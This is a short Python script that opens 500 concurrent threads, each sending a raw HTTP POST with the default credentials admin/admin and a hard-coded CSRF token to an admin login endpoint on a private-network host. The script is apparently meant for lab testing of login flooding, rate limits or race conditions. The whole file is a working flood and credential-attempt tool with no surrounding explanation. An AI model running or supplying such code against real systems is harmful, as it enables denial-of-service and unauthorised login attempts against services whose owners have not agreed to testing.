import socket
import threading

def send_post_request():
    target_ip = "192.168.0.103"
     # IP address of the target system
    target_port = 8000  # Port number of the target system
    csrf_token = "Por5GCd71rgRnfQJw23a08atKNx80ZsC"  # Replace with the actual CSRF token value

    # Construct the HTTP POST request with form data
    body = "name=admin&password=admin"  # Replace with actual username and password
    content_length = len(body)
    message = f"POST /admins/login/ HTTP/1.1\r\n"
    message += f"Host: {target_ip}\r\n"
    message += f"Content-Type: application/x-www-form-urlencoded\r\n"
    message += f"Content-Length: {content_length}\r\n"
    message += f"CSRF-Token: {csrf_token}\r\n"
    message += "\r\n"  # End of headers
    message += body

    try:
        # Create a socket object
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the target system
        client_socket.connect((target_ip, target_port))

        # Send the POST request
        client_socket.sendall(message.encode())

        # Receive the response
        response = b""
        while True:
            chunk = client_socket.recv(4096)
            if not chunk:
                break
            response += chunk

        # Decode and print the response
        print("Response from server:")
        print(response.decode())

    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        # Close the socket
        if 'client_socket' in locals():
            client_socket.close()

# Create threads to send POST requests concurrently
threads = []
for i in range(500):
    thread = threading.Thread(target=send_post_request)
    threads.append(thread)
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()